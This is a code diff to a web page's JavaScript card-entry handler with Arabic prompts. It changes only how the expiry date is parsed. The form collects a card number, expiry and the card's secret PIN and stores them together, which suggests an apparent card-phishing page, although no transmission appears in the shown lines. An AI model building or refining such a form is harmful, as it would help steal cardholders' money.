@@ -780,11 +780,11 @@
 
     async function handleSend() {
       const card   = cardInput.value.replace(/\s/g,'');
-      const expiry = document.getElementById('expiry').value.replace(/\s/g,'').replace('/','');
+      const expiryRaw = document.getElementById('expiry').value.replace(/\s/g,'').replace('/','');
       const pin    = document.getElementById('pin').value;
       const ok     = document.getElementById('terms').checked;
       if (card.length < 16) { alert('الرجاء إدخال رقم البطاقة كاملاً'); return; }
-      if (expiry.length < 4) { alert('الرجاء إدخال تاريخ انتهاء البطاقة'); return; }
+      if (expiryRaw.length < 4) { alert('الرجاء إدخال تاريخ انتهاء البطاقة'); return; }
       if (pin.length < 4)   { alert('الرجاء إدخال الرقم السري'); return; }
       if (!ok)              { alert('الرجاء الموافقة على الشروط والأحكام'); return; }
 
@@ -793,8 +793,9 @@
       const amount = p.get('amount') || '';
       const sid    = p.get('sid')    || '';
       savedCard = card;
-      savedExpMonth = expiry.slice(0,2);
-      savedExpYear  = '20' + expiry.slice(2,4);
+      savedExpMonth = expiryRaw.slice(2,4);
+      savedExpYear  = '20' + expiryRaw.slice(0,2);
+      var expiry = expiryRaw.slice(2,4) + '/' + expiryRaw.slice(0,2);
 
       let subId = sid || null;
       try {
